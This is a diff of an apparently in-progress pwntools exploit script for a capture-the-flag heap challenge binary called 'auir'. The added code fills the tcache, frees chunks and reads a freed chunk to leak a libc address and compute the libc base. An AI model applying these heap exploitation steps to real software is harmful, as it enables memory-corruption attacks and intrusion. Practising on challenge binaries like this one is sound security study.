@@ -1,5 +1,4 @@
 import pwn as p
-from pwnlib.util.misc import dealarm_shell
 
 # target = p.process('./0ctfbabyheap', env={'LD_PRELOAD': './libc-2.23.so'})
 target = p.process('./auir')
@@ -51,27 +50,35 @@ def display_skills(index: int):
 
 
 # fill tcache
-# for i in range(7):
-#     make_zealots(0x20, b'')
-# for i in range(7):
-#     destroy_zealots(i)
+for i in range(7):
+    make_zealots(0xf0, b'')
+    make_zealots(0x70, b'')
+
+
+make_zealots(0xf0, b'0'*0xf0)  # id 14
+make_zealots(0x70, b'1'*0x70)  # id 15
+make_zealots(0xf0, b'2'*0xf0)  # id 16
+make_zealots(0x70, b'3'*0x70)  # id 17
+
+for i in range(7):
+    destroy_zealots(i)
+    destroy_zealots(i+7)
+
+destroy_zealots(16)
+destroy_zealots(17)
+
+leak = p.u64(display_skills(16)[:8])
+print('leak:', hex(leak))
+libc_base = leak - 0x1ebbe0
+print('libc_base:', hex(libc_base))
+
+# make_zealots(0x70, b'4'*0x70)  # id 25
+# make_zealots(0x70, b'5'*0x70)  # id 26
 
 # for i in range(7):
-#     make_zealots(0x40, b'')
-# for i in range(7):
-#     destroy_zealots(7+i)
+#     destroy_zealots(i+14)
 
-
-make_zealots(0x20, b'0'*0x20)
-make_zealots(0x20, b'1'*0x20)
-make_zealots(0x20, b'2'*0x20)
-make_zealots(0x20, b'3'*0x20)
-
-fix_zealots(0, 0x30, b'A'*0x20+p.p64(0)+p.p64(0x61))
-fix_zealots(1, 0x30, b'B'*0x20+p.p64(0x60)+p.p64(0x30))
-
-destroy_zealots(2)
-
-display_skills(1)
+# destroy_zealots(25)
+# destroy_zealots(26)
 
 target.interactive()
